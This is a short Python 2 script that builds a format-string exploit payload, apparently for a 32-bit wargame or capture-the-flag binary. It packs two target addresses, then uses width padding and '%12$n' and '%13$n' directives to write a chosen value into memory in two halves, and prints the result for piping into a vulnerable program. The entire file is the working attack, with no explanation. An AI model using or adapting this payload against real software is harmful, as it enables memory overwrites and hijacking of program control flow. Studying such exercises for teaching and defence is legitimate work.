#!/usr/bin/python
from struct import pack as p

t1 = p("I",0x080496f4)
t2 = p("I", 0x080496f6)

s = ''
s += t1 
s += t2
s += '\%21818x'
s += '\%12$n'
s += '\%43964x'
s += '\%13$n'

print s
